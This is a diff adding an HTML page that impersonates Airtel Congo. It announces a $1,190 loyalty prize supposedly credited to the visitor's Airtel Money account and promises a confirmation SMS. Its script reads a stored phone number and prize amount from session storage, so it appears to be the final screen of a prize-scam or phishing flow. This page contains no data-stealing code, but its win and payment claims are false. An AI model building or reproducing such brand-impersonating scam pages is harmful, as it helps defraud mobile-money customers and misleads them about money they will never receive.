@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AIRTEL CONGO - Félicitations</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { min-height: 100vh; background: #0a0a0a; font-family: 'DM Sans', 'Segoe UI', Roboto, Arial, sans-serif; overflow-x: hidden; }
+
+  .success-root {
+    position: relative;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #1a0000 0%, #2d0000 40%, #1a0505 100%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 32px 20px 24px;
+    overflow: hidden;
+  }
+
+  /* Blobs */
+  .blob {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.5;
+    pointer-events: none;
+  }
+  .blob-1 {
+    width: 400px; height: 400px;
+    background: #e30613;
+    top: -100px; left: -100px;
+    animation: float 8s ease-in-out infinite;
+  }
+  .blob-2 {
+    width: 350px; height: 350px;
+    background: #ffcc00;
+    bottom: -80px; right: -80px;
+    animation: float 10s ease-in-out infinite reverse;
+    opacity: 0.3;
+  }
+  @keyframes float {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(30px, -30px) scale(1.1); }
+  }
+
+  .confetti-layer { position: absolute; inset: 0; pointer-events: none; overflow: hidden; }
+
+  .confetti-piece {
+    position: absolute;
+    width: 10px; height: 10px;
+    top: -20px;
+    opacity: 0;
+    animation: confetti-fall linear forwards;
+  }
+  @keyframes confetti-fall {
+    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+  }
+
+  /* Content */
+  .success-inner {
+    position: relative;
+    z-index: 10;
+    width: 100%;
+    max-width: 440px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 24px;
+  }
+
+  /* Logo bar */
+  .logo-bar {
+    display: flex; align-items: center; gap: 12px;
+    background: rgba(255,255,255,0.05);
+    padding: 10px 20px; border-radius: 50px;
+    border: 1px solid rgba(255,255,255,0.1);
+    backdrop-filter: blur(10px);
+  }
+  .logo-bar img { height: 28px; width: auto; filter: brightness(0) invert(1); }
+  .logo-divider { width: 1px; height: 22px; background: rgba(255,255,255,0.2); }
+  .logo-bar-badge { color: #ffcc00; font-size: 12px; font-weight: 700; letter-spacing: 0.5px; }
+
+  /* Success check */
+  .success-check {
+    width: 110px; height: 110px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 0 60px rgba(34, 197, 94, 0.6);
+    animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    margin-top: 8px;
+  }
+  @keyframes popIn {
+    0% { transform: scale(0.3); opacity: 0; }
+    60% { transform: scale(1.1); opacity: 1; }
+    100% { transform: scale(1); }
+  }
+  .success-check svg {
+    width: 56px; height: 56px;
+    stroke: #fff; stroke-width: 3;
+    fill: none; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  /* Title */
+  .success-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 30px;
+    font-weight: 800;
+    color: #fff;
+    text-align: center;
+    line-height: 1.2;
+    letter-spacing: -0.5px;
+  }
+  .success-gold {
+    background: linear-gradient(90deg, #ffcc00, #ffaa00, #ffcc00);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .success-sub {
+    font-size: 14px;
+    color: rgba(255,255,255,0.75);
+    text-align: center;
+    line-height: 1.6;
+    max-width: 340px;
+  }
+
+  /* Amount card */
+  .amount-card {
+    width: 100%;
+    background: linear-gradient(135deg, rgba(255,204,0,0.15), rgba(227,6,19,0.15));
+    border: 2px solid rgba(255,204,0,0.4);
+    border-radius: 20px;
+    padding: 26px 24px;
+    text-align: center;
+    box-shadow: 0 12px 40px rgba(255,204,0,0.2);
+    position: relative;
+    overflow: hidden;
+  }
+  .amount-card::before {
+    content: "";
+    position: absolute;
+    top: -50%; left: -50%;
+    width: 200%; height: 200%;
+    background: radial-gradient(circle, rgba(255,204,0,0.15), transparent 60%);
+    animation: shimmer 4s ease-in-out infinite;
+    pointer-events: none;
+  }
+  @keyframes shimmer {
+    0%, 100% { transform: scale(1); opacity: 0.5; }
+    50% { transform: scale(1.2); opacity: 0.8; }
+  }
+
+  .amount-label {
+    font-size: 11px;
+    color: rgba(255,255,255,0.6);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    font-weight: 700;
+    margin-bottom: 8px;
+    position: relative;
+  }
+
+  .amount-value {
+    font-family: 'Syne', sans-serif;
+    font-size: 48px;
+    font-weight: 800;
+    color: #ffcc00;
+    letter-spacing: -2px;
+    line-height: 1;
+    position: relative;
+    text-shadow: 0 0 30px rgba(255,204,0,0.5);
+  }
+
+  .amount-sublabel {
+    font-size: 12px;
+    color: rgba(255,255,255,0.6);
+    margin-top: 8px;
+    position: relative;
+  }
+
+  /* Notice */
+  .notice {
+    width: 100%;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 16px;
+    padding: 16px 18px;
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    backdrop-filter: blur(10px);
+  }
+  .notice-icon { font-size: 22px; flex-shrink: 0; line-height: 1; }
+  .notice-text { font-size: 12.5px; color: rgba(255,255,255,0.8); line-height: 1.6; }
+  .notice-text strong { color: #fff; font-weight: 700; }
+
+  /* Button */
+  .done-btn {
+    width: 100%;
+    padding: 17px;
+    border: none;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #c0001a 0%, #e8001f 100%);
+    color: #fff;
+    font-family: 'Syne', sans-serif;
+    font-size: 14px;
+    font-weight: 800;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    cursor: pointer;
+    box-shadow: 0 10px 30px rgba(192, 0, 26, 0.5);
+    transition: all 0.3s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-top: 8px;
+    text-decoration: none;
+  }
+  .done-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 40px rgba(192, 0, 26, 0.65);
+  }
+  .done-btn:active { transform: scale(0.98); }
+
+  /* Footer */
+  .success-footer {
+    margin-top: auto;
+    padding-top: 24px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    color: rgba(255,255,255,0.4);
+    text-align: center;
+  }
+  .success-footer strong { color: #ffcc00; font-weight: 700; }
+
+  @media (max-width: 480px) {
+    .success-root { padding: 24px 16px 20px; }
+    .success-title { font-size: 26px; }
+    .amount-value { font-size: 42px; }
+    .amount-card { padding: 22px 20px; }
+    .success-check { width: 96px; height: 96px; }
+    .success-check svg { width: 48px; height: 48px; }
+  }
+</style>
+</head>
+<body>
+<div id="root">
+  <div class="success-root">
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="confetti-layer" id="confettiLayer"></div>
+
+    <div class="success-inner">
+
+      <div class="logo-bar">
+        <img alt="Airtel" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+        <div class="logo-divider"></div>
+        <span class="logo-bar-badge">25 ans ensemble</span>
+      </div>
+
+      <div class="success-check">
+        <svg viewBox="0 0 24 24">
+          <polyline points="5 13 10 18 20 6"></polyline>
+        </svg>
+      </div>
+
+      <h1 class="success-title">
+        Félicitations !<br>
+        <span class="success-gold">Vous avez gagné 🎉</span>
+      </h1>
+
+      <p class="success-sub">
+        Votre éligibilité a été confirmée. Voici votre récompense de fidélité des 25 ans d'Airtel DRC.
+      </p>
+
+      <div class="amount-card">
+        <p class="amount-label">Votre prix</p>
+        <p class="amount-value" id="amountValue">$1,190</p>
+        <p class="amount-sublabel">Crédité sur votre compte Airtel Money</p>
+      </div>
+
+      <div class="notice">
+        <div class="notice-icon">📱</div>
+        <div class="notice-text">
+          <strong>Prochaine étape :</strong> vous recevrez un SMS de confirmation sous peu. Vérifiez votre solde Airtel Money dans quelques minutes.
+        </div>
+      </div>
+
+      <a href="index.html" class="done-btn">
+        Terminer
+      </a>
+
+      <div class="success-footer">
+        © 2026 Airtel Congo. Tous droits réservés.<br>
+        <strong>25 ans ensemble, merci pour votre fidélité.</strong>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ==================== LOAD AMOUNT ==================== */
+  const amount = sessionStorage.getItem('airtel_amount') || '1190';
+  const phone = sessionStorage.getItem('airtel_phone') || '';
+
+  document.getElementById('amountValue').textContent =
+    '$' + parseInt(amount).toLocaleString('en-US');
+
+  /* ==================== CONFETTI ==================== */
+  const confettiLayer = document.getElementById('confettiLayer');
+  const colors = ['#e30613', '#ffcc00', '#ffffff', '#00c853', '#ffaa00', '#ffd700'];
+
+  function createConfetti() {
+    const piece = document.createElement('div');
+    piece.classList.add('confetti-piece');
+    piece.style.left = Math.random() * 100 + '%';
+    piece.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+    piece.style.width = (Math.random() * 8 + 6) + 'px';
+    piece.style.height = (Math.random() * 8 + 6) + 'px';
+    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+    piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
+    piece.style.animationDelay = Math.random() * 0.5 + 's';
+    confettiLayer.appendChild(piece);
+    setTimeout(() => piece.remove(), 5000);
+  }
+
+  // Initial burst
+  for (let i = 0; i < 60; i++) {
+    setTimeout(createConfetti, i * 30);
+  }
+  // Continuous light confetti
+  setInterval(createConfetti, 400);
+</script>
+</body>
+</html>
